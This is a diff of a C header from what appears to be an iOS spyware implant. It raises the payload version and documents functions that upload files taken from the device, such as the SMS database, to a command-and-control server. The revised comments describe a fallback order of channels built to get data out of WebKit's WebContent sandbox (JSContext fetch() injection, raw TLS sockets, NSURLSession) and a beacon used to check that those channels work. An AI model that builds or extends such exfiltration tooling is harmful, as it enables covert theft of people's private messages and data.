@@ -13,7 +13,7 @@
  * behaviour so the operator can confirm which version is running on-device.
  * Format: "<major>.<minor>".  Major = breaking change, minor = incremental.
  */
-#define PAYLOAD_VERSION "1.3"
+#define PAYLOAD_VERSION "1.4"
 
 /*
  * upload_to_c2 — HTTP(S) POST one record to the Go /upload endpoint.
@@ -21,18 +21,25 @@
  *   path        : source path on device, e.g. "/var/mobile/Library/SMS/sms.db"
  *   description : human-readable label
  *   b64data     : base64-encoded payload bytes
+ *
+ * Upload channel priority (each falls back to the next on failure):
+ *   C — JSContext fetch() injection (WebContent JS thread / saved context)
+ *   B — raw POSIX socket + SecureTransport TLS
+ *   A — NSURLSession (blocked in WebContent, used outside WebContent)
  */
 void upload_to_c2(const char *category, const char *path,
                   const char *description, const char *b64data);
 
 /*
- * upload_beacon — lightweight synchronous probe (~10-second max block).
- * Uses Channel B (raw socket + SecureTransport) first; falls back to
- * Channel A (NSURLSession) if Channel B fails.
- * Safe to call directly from process() in Stage3's calling context.
- * Reports: PAYLOAD_VERSION, iOS build, process name, PID.
- * If this appears in server logs → raw-socket path works inside WebContent.
- * If it does NOT appear → sandbox blocks port-443 outbound or TLS failed.
+ * upload_beacon — synchronous diagnostic probe called from process().
+ *
+ * Channel priority: C → B → A (same as upload_to_c2).
+ * Channel C is tried first because process() runs on the JS execution thread
+ * where [JSContext currentContext] is live; the resulting fetch() uses
+ * WebKit's own networking (always allowed in WebContent).
+ *
+ * If beacon appears in logs  → C or B works inside WebContent.
+ * If beacon is absent        → sandbox blocks ALL outbound; check JS errors.
  */
 void upload_beacon(void);
 
